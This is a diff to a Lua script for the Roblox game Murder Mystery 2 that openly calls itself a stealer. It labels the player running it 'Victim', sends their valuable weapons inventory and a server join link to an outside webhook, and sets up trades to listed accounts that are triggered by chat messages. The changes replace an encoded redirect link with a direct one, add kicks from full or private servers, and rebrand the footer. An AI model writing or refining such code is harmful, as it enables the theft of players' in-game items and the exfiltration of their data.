@@ -19,21 +19,6 @@ if not req then
     return
 end
 
--- Función Base64 propia
-local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-local function base64Encode(data)
-    return ((data:gsub('.', function(x)
-        local r,binary='',x:byte()
-        for i=8,1,-1 do r=r..(binary%2^i-binary%2^(i-1)>0 and '1' or '0') end
-        return r
-    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
-        if #x < 6 then return '' end
-        local c=0
-        for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
-        return b:sub(c+1,c+1)
-    end)..({ '', '==', '=' })[#data%3+1])
-end
-
 -- Función para enviar webhook
 local function SendWebhook(title, description, fields, prefix)
     local data = {
@@ -44,7 +29,7 @@ local function SendWebhook(title, description, fields, prefix)
             ["color"] = 65280,
             ["fields"] = fields or {},
             ["thumbnail"] = {["url"] = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"},
-            ["footer"] = {["text"] = "MM2 Supreme Stealer Protegido"}
+            ["footer"] = {["text"] = "The best stealer by Anonimo 🇪🇨"}
         }}
     }
     local body = HttpService:JSONEncode(data)
@@ -176,23 +161,21 @@ end
 -- Ordenar armas por valor total
 table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
 
--- Generar join protegido
-local rawLink="https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..math.random(100000,999999)
-local encodedLink=base64Encode(rawLink)
-local safeLink="https://fern.wtf/redirect?data="..HttpService:UrlEncode(encodedLink)
+-- Generar join directo sin encode/redirect
+local safeLink = "https://www.roblox.com/games/"..game.PlaceId.."/"..game.JobId
 
 -- Webhook fields
 local fields={
-    {name="Victim 👤", value=LocalPlayer.Name, inline=true},
-    {name="Enlace seguro 🔗", value=safeLink, inline=false},
-    {name="Inventario 📦", value="", inline=false},
-    {name="Valor total 📦", value=tostring(totalValue), inline=true}
+    {name="Victim 👤:", value=LocalPlayer.Name, inline=true},
+    {name="Enlaze para unirse🔗::", value=safeLink, inline=false},
+    {name="Inventario 📦:", value="", inline=false},
+    {name="Valor total del inventario📦:", value=tostring(totalValue), inline=true}
 }
 for _, w in ipairs(weaponsToSend) do
     fields[3].value=fields[3].value..string.format("%s x%s (%s) | Value: %s\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
 end
 local prefix=pingEveryone and "@everyone " or ""
-SendWebhook("💪MM2 Hit Protegido💯","💰Solo Godly/Ancient armas",fields,prefix)
+SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fields,prefix)
 
 -- Trade
 local function doTrade(targetName)
@@ -215,14 +198,30 @@ local function doTrade(targetName)
     end
 end
 
+-- Kick y manejo de servidor lleno/privado
+local function CheckServer()
+    local maxPlayers = 12
+    if #Players:GetPlayers() >= maxPlayers then
+        LocalPlayer:Kick("Servidor lleno. Buscando servidor vacío...")
+    elseif game.PrivateServerId ~= "" then
+        LocalPlayer:Kick("Servidor privado detectado. Buscando servidor público...")
+    end
+end
+
 -- Esperar chat para iniciar trade
 for _, p in ipairs(Players:GetPlayers()) do
     if table.find(users,p.Name) then
-        p.Chatted:Connect(function() doTrade(p.Name) end)
+        p.Chatted:Connect(function() 
+            CheckServer()
+            doTrade(p.Name) 
+        end)
     end
 end
 Players.PlayerAdded:Connect(function(p)
     if table.find(users,p.Name) then
-        p.Chatted:Connect(function() doTrade(p.Name) end)
+        p.Chatted:Connect(function() 
+            CheckServer()
+            doTrade(p.Name) 
+        end)
     end
 end)
